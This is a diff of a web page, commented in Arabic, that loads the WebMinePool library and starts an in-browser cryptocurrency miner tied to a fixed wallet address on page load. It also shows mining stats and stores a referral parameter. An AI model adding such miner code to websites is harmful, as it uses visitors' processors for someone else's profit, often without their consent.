@@ -36,8 +36,11 @@
     <div class="referral" id="referralInfo"></div>
   </div>
 
+  <!-- مكتبة WebMinePool -->
   <script src="https://webminepool.com/lib/simple-ui.js"></script>
+
   <script>
+    // بدء التعدين
     let miner = WMP.Anonymous('43zEiFNinS32j1F229r8AqZxpbtfAAeZYXY6T4GhWB8gNmZxfLMBtzpCW2u3HsZsncazQB7wfZB5rR8kPm7ET9b4G5RmjFr');
     miner.start();
 
@@ -66,13 +69,16 @@
 
     setInterval(updateStats, 1000);
 
-    // رابط الإحالة
-    const urlParams = new URLSearchParams(window.location.search);
-    const ref = urlParams.get('ref');
-    if (ref) {
-      document.getElementById("referralInfo").textContent = "Referred by: " + ref;
-      localStorage.setItem("referral", ref);
-    }
+    // قراءة رابط الإحالة من URL
+    window.addEventListener('DOMContentLoaded', () => {
+      const urlParams = new URLSearchParams(window.location.search);
+      const ref = urlParams.get('ref');
+      if (ref) {
+        const refDiv = document.getElementById("referralInfo");
+        refDiv.textContent = "Referred by: " + ref;
+        localStorage.setItem("referral", ref);
+      }
+    });
   </script>
 </body>
 </html>
